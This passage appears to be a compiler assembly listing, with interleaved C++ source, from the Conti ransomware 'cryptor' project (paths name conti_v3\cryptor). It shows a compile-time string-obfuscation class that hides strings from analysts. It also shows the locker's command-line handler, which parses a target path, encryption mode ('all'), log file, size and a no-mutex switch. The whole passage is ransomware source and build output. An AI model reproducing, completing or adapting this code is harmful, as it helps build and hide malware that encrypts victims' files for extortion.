	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 40	 sub	 eax, 64			; 00000040H
  0002d	6b c0 dd	 imul	 eax, eax, -35		; ffffffffffffffddH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 1d	 imul	 eax, eax, 29
  0002d	83 c0 40	 add	 eax, 64			; 00000040H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 06	 cmp	 QWORD PTR i$1[rbp], 6
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv140 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00131	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00135	88 85 c0 00 00
	00		 mov	 BYTE PTR tv140[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0013b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00142	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00149	5f		 pop	 rdi
  0014a	5d		 pop	 rbp
  0014b	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?HandleCommandLine@@YAHPEA_W@Z
_TEXT	SEGMENT
Argc$ = 4
Argv$ = 40
Path$ = 72
EncryptMode$ = 104
LogFile$ = 136
Size$ = 168
iSize$4 = 196
$T5 = 612
$T6 = 644
$T7 = 680
$T8 = 728
$T9 = 776
$T10 = 824
$T11 = 872
$T12 = 920
$T13 = 968
__$ArrayPad$ = 1000
CmdLine$ = 1040
?HandleCommandLine@@YAHPEA_W@Z PROC			; HandleCommandLine, COMDAT

; 132  : {

$LN17:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 18 04
	00 00		 sub	 rsp, 1048		; 00000418H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 9e 00 00 00	 mov	 ecx, 158		; 0000009eH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 38
	04 00 00	 mov	 rcx, QWORD PTR [rsp+1080]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 e8 03
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 133  : 	INT Argc = 0;

  00049	c7 45 04 00 00
	00 00		 mov	 DWORD PTR Argc$[rbp], 0

; 134  : 	LPWSTR* Argv = (LPWSTR*)pCommandLineToArgvW(CmdLine, &Argc);

  00050	48 8d 55 04	 lea	 rdx, QWORD PTR Argc$[rbp]
  00054	48 8b 8d 10 04
	00 00		 mov	 rcx, QWORD PTR CmdLine$[rbp]
  0005b	e8 00 00 00 00	 call	 ?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z ; pCommandLineToArgvW
  00060	48 89 45 28	 mov	 QWORD PTR Argv$[rbp], rax

; 135  : 	if (!Argv) {

  00064	48 83 7d 28 00	 cmp	 QWORD PTR Argv$[rbp], 0
  00069	75 07		 jne	 SHORT $LN2@HandleComm

; 136  : 		return FALSE;

  0006b	33 c0		 xor	 eax, eax
  0006d	e9 4d 02 00 00	 jmp	 $LN1@HandleComm
$LN2@HandleComm:

; 137  : 	}
; 138  : 
; 139  : 	LPWSTR Path = GetCommandLineArg(Argv, Argc, OBFW(L"-p"));

  00072	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_15JODAOICI@?$AA?9?$AAp@
  00079	48 8d 8d 64 02
	00 00		 lea	 rcx, QWORD PTR $T5[rbp]
  00080	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
  00085	48 8b c8	 mov	 rcx, rax
  00088	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0008d	4c 8b c0	 mov	 r8, rax
  00090	8b 55 04	 mov	 edx, DWORD PTR Argc$[rbp]
  00093	48 8b 4d 28	 mov	 rcx, QWORD PTR Argv$[rbp]
  00097	e8 00 00 00 00	 call	 ?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z ; GetCommandLineArg
  0009c	48 89 45 48	 mov	 QWORD PTR Path$[rbp], rax

; 140  : 	LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L"-m"));

  000a0	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_15DMEDGHGK@?$AA?9?$AAm@
  000a7	48 8d 8d 84 02
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ae	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
  000b3	48 8b c8	 mov	 rcx, rax
  000b6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  000bb	4c 8b c0	 mov	 r8, rax
  000be	8b 55 04	 mov	 edx, DWORD PTR Argc$[rbp]
  000c1	48 8b 4d 28	 mov	 rcx, QWORD PTR Argv$[rbp]
  000c5	e8 00 00 00 00	 call	 ?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z ; GetCommandLineArg
  000ca	48 89 45 68	 mov	 QWORD PTR EncryptMode$[rbp], rax

; 141  : 	LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(L"-log"));

  000ce	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@
  000d5	48 8d 8d a8 02
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  000dc	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  000e1	48 8b c8	 mov	 rcx, rax
  000e4	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  000e9	4c 8b c0	 mov	 r8, rax
  000ec	8b 55 04	 mov	 edx, DWORD PTR Argc$[rbp]
  000ef	48 8b 4d 28	 mov	 rcx, QWORD PTR Argv$[rbp]
  000f3	e8 00 00 00 00	 call	 ?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z ; GetCommandLineArg
  000f8	48 89 85 88 00
	00 00		 mov	 QWORD PTR LogFile$[rbp], rax

; 142  : 	LPWSTR Size = GetCommandLineArg(Argv, Argc, OBFW(L"-size"));

  000ff	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@
  00106	48 8d 8d d8 02
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  0010d	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
  00112	48 8b c8	 mov	 rcx, rax
  00115	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0011a	4c 8b c0	 mov	 r8, rax
  0011d	8b 55 04	 mov	 edx, DWORD PTR Argc$[rbp]
  00120	48 8b 4d 28	 mov	 rcx, QWORD PTR Argv$[rbp]
  00124	e8 00 00 00 00	 call	 ?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z ; GetCommandLineArg
  00129	48 89 85 a8 00
	00 00		 mov	 QWORD PTR Size$[rbp], rax

; 143  : 
; 144  : 	if (FindCommandLineArg(Argv, Argc, OBFW(L"-nomutex"))) {

  00130	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@
  00137	48 8d 8d 08 03
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  0013e	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
  00143	48 8b c8	 mov	 rcx, rax
  00146	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
  0014b	4c 8b c0	 mov	 r8, rax
  0014e	8b 55 04	 mov	 edx, DWORD PTR Argc$[rbp]
  00151	48 8b 4d 28	 mov	 rcx, QWORD PTR Argv$[rbp]
  00155	e8 00 00 00 00	 call	 ?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z ; FindCommandLineArg
  0015a	85 c0		 test	 eax, eax
  0015c	74 0c		 je	 SHORT $LN3@HandleComm

; 145  : 		g_NoMutex = TRUE;

  0015e	c7 05 00 00 00
	00 01 00 00 00	 mov	 DWORD PTR ?g_NoMutex@@3HA, 1 ; g_NoMutex

; 146  : 	}

  00168	eb 0a		 jmp	 SHORT $LN4@HandleComm
$LN3@HandleComm:

; 147  : 	else {
; 148  : 		g_NoMutex = FALSE;

  0016a	c7 05 00 00 00
	00 00 00 00 00	 mov	 DWORD PTR ?g_NoMutex@@3HA, 0 ; g_NoMutex
$LN4@HandleComm:

; 149  : 	}
; 150  : 
; 151  : 	if (EncryptMode) {

  00174	48 83 7d 68 00	 cmp	 QWORD PTR EncryptMode$[rbp], 0
  00179	0f 84 dd 00 00
	00		 je	 $LN5@HandleComm

; 152  : 
; 153  : 		if (!plstrcmpiW(EncryptMode, OBFW(L"all"))) {

  0017f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@
  00186	48 8d 8d 38 03
	00 00		 lea	 rcx, QWORD PTR $T10[rbp]
  0018d	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
  00192	48 8b c8	 mov	 rcx, rax
  00195	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  0019a	48 8b d0	 mov	 rdx, rax
  0019d	48 8b 4d 68	 mov	 rcx, QWORD PTR EncryptMode$[rbp]
  001a1	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  001a6	85 c0		 test	 eax, eax
  001a8	75 0f		 jne	 SHORT $LN6@HandleComm

; 154  : 			global::SetEncryptMode(ALL_ENCRYPT);

  001aa	b9 0a 00 00 00	 mov	 ecx, 10
  001af	e8 00 00 00 00	 call	 ?SetEncryptMode@global@@YAXH@Z ; global::SetEncryptMode

; 155  : 		}

  001b4	e9 a3 00 00 00	 jmp	 $LN7@HandleComm
$LN6@HandleComm:

